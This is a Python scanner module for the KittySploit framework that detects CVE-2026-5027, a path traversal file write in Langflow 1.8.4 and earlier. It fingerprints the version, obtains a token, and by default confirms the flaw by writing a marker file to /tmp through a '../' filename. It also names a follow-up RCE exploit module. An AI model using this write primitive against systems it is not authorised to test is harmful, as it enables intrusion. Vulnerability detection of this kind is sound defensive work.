#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""CVE-2026-5027 — Langflow path traversal file write detection."""

import re
import time
from typing import Optional, Tuple

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": "Langflow CVE-2026-5027 path traversal detection",
        "description": (
            "Detects Langflow <= 1.8.4 affected by CVE-2026-5027 (unsanitized "
            "multipart filename on POST /api/v2/files → arbitrary file write). "
            "Checks /api/v1/version, probes auto-login, and optionally confirms "
            "with a benign write to /tmp. Fixed in 1.9.0+."
        ),
        "author": ["Yahia Hamza", "Tenable", "KittySploit Team"],
        "severity": "high",
        "cve": "CVE-2026-5027",
        "references": [
            "https://nvd.nist.gov/vuln/detail/CVE-2026-5027",
            "https://www.tenable.com/security/research/tra-2026-26",
            "https://github.com/langflow-ai/langflow/security/advisories/GHSA-g2j9-7rj2-gm6c",
            "https://github.com/yahiahamza/CVE-2026-5027",
        ],
        "modules": [
            "exploits/multi/http/langflow_cve_2026_5027_file_write_rce",
        ],
        "tags": [
            "web",
            "scanner",
            "langflow",
            "path-traversal",
            "file-write",
            "rce",
            "cve-2026-5027",
        ],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 4,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.3,
            "value": 1.0,
            "requires": {
                "min_endpoints": 0,
                "min_params": 0,
                "tech_hints_any": ["langflow"],
                "tech_hints_all": [],
                "specializations_any": [],
                "risk_signals_any": [],
                "auth_session": False,
                "capabilities_any": [],
                "capabilities_all": [],
                "confidence_min": {},
                "confidence_min_any": {},
                "endpoint_pattern_any": ["/api/v2/files", "/api/v1/auto_login"],
                "param_any": [],
                "api_surface_ready": False,
            },
            "chain": {
                "produces_capabilities": [
                    {"capability": "file_write", "from_detail": "path_traversal"},
                    {"capability": "rce", "from_detail": "cron"},
                ],
                "consumes_capabilities": [],
                "option_bindings": {},
                "suggested_followups": [
                    "exploits/multi/http/langflow_cve_2026_5027_file_write_rce",
                ],
            },
        },
    }

    port = OptPort(7860, "Langflow HTTP port (default 7860)", True)
    ssl = OptBool(False, "Use HTTPS", True, advanced=True)
    base_path = OptString("/", "Langflow base path", required=False)
    username = OptString("", "Optional username if auto-login disabled", required=False)
    password = OptString("", "Optional password", required=False)
    active_probe = OptBool(
        True,
        "Confirm with benign path-traversal write to /tmp",
        required=False,
    )

    def _timeout(self) -> int:
        return max(int(self.timeout or 15), 10)

    def _base(self) -> str:
        val = str(self.base_path or "/").strip() or "/"
        if not val.startswith("/"):
            val = "/" + val
        return val.rstrip("/")

    def _path(self, suffix: str) -> str:
        base = self._base()
        if not suffix.startswith("/"):
            suffix = "/" + suffix
        return f"{base}{suffix}" if base else suffix

    @staticmethod
    def _ver_tuple(value: str) -> Optional[Tuple[int, ...]]:
        parts = []
        for token in str(value or "").split(".")[:3]:
            digits = "".join(ch for ch in token if ch.isdigit())
            if not digits:
                return None
            parts.append(int(digits))
        return tuple(parts) if parts else None

    def _is_affected(self, version: str) -> Optional[bool]:
        parsed = self._ver_tuple(version)
        if not parsed:
            return None
        # Affected through 1.8.4; fixed in 1.9.0+
        if parsed <= (1, 8, 4):
            return True
        return False

    def _get_token(self) -> Tuple[str, str]:
        response = self.http_request(
            method="GET",
            path=self._path("/api/v1/auto_login"),
            timeout=self._timeout(),
            allow_redirects=False,
        )
        if response and response.status_code == 200:
            try:
                token = (response.json() or {}).get("access_token") or ""
            except Exception:
                token = ""
            if token:
                return token, "auto-login"

        user = str(self.username or "").strip()
        password = str(self.password or "").strip()
        if user and password:
            response = self.http_request(
                method="POST",
                path=self._path("/api/v1/login"),
                json={"username": user, "password": password},
                timeout=self._timeout(),
                allow_redirects=False,
            )
            if response and response.status_code == 200:
                try:
                    token = (response.json() or {}).get("access_token") or ""
                except Exception:
                    token = ""
                if token:
                    return token, "credentials"
        return "", ""

    def _write_file(self, token: str, remote_path: str, content: bytes):
        filename = ("../" * 9) + remote_path.lstrip("/")
        return self.http_request(
            method="POST",
            path=self._path("/api/v2/files"),
            headers={"Authorization": f"Bearer {token}"},
            files={"file": (filename, content, "application/octet-stream")},
            timeout=self._timeout(),
            allow_redirects=False,
        )

    def _fingerprint(self) -> Tuple[bool, str]:
        response = self.http_request(
            method="GET",
            path=self._path("/api/v1/version"),
            timeout=self._timeout(),
            allow_redirects=True,
        )
        if response and response.status_code == 200:
            try:
                data = response.json() or {}
            except Exception:
                data = {}
            version = str(data.get("version") or data.get("Version") or "").strip()
            if version:
                return True, version
            text = response.text or ""
            if "langflow" in text.lower():
                match = re.search(r"(\d+\.\d+\.\d+)", text)
                return True, match.group(1) if match else ""

        for path in ("/", "/login", "/api/v1/health"):
            response = self.http_request(
                method="GET",
                path=self._path(path),
                timeout=self._timeout(),
                allow_redirects=True,
            )
            if not response:
                continue
            text = (response.text or "").lower()
            if "langflow" in text:
                match = re.search(r"(\d+\.\d+\.\d+)", response.text or "")
                return True, match.group(1) if match else ""
        return False, ""

    def run(self):
        print_status("Fingerprinting Langflow…")
        found, version = self._fingerprint()
        if not found:
            print_error("Langflow not detected")
            return False

        print_success("Langflow detected")
        affected = None
        if version:
            print_info(f"Version: {version}")
            affected = self._is_affected(version)
            if affected is True:
                print_warning("Version <= 1.8.4 — CVE-2026-5027 likely")
            elif affected is False:
                print_success("Version >= 1.9.0 — appears patched")
            else:
                print_info("Could not map version to vulnerability window")
        else:
            print_info("Version unknown")

        print_status("Obtaining access token…")
        token, method = self._get_token()
        if not token:
            print_error(
                "No token (auto-login disabled and no credentials). "
                "Set username/password or follow-up may still work if auth obtained."
            )
            if affected is True:
                if hasattr(self, "set_info"):
                    self.set_info(
                        severity="high",
                        cve="CVE-2026-5027",
                        version=version or None,
                        reason=f"Langflow {version} affected range; auth not obtained",
                        confidence="medium",
                    )
                return True
            return False

        print_success(f"Token via {method}")

        confirmed = False
        if self.active_probe:
            stamp = time.strftime("%Y%m%d%H%M%S")
            proof_path = f"/tmp/ks_cve_2026_5027_{stamp}.txt"
            content = f"CVE-2026-5027 KittySploit probe {stamp}\n".encode()
            print_status(f"Benign write probe → {proof_path}")
            response = self._write_file(token, proof_path, content)
            if response and response.status_code in (200, 201):
                try:
                    data = response.json() or {}
                except Exception:
                    data = {}
                server_path = str(data.get("path") or "")
                confirmed = True
                print_warning(
                    f"Traversal upload accepted (HTTP {response.status_code})"
                )
                if server_path:
                    print_info(f"Server path: {server_path}")
                    if "/tmp/" in server_path or proof_path in server_path:
                        print_warning("Response path escaped upload directory")
            else:
                code = getattr(response, "status_code", None)
                print_info(f"Write probe failed (HTTP {code})")

        if confirmed or affected is True:
            if hasattr(self, "set_info"):
                self.set_info(
                    severity="high",
                    cve="CVE-2026-5027",
                    version=version or None,
                    reason=(
                        "Arbitrary file write confirmed via /api/v2/files"
                        if confirmed
                        else f"Langflow {version} <= 1.8.4"
                    ),
                    confidence="high" if confirmed else "medium",
                )
            print_warning(
                "Follow up: exploits/multi/http/langflow_cve_2026_5027_file_write_rce"
            )
            return True

        if affected is False:
            if hasattr(self, "set_info"):
                self.set_info(
                    severity="info",
                    version=version,
                    reason=f"Langflow {version} appears patched",
                )
            return True

        print_info("Langflow found; CVE-2026-5027 not confirmed")
        return True
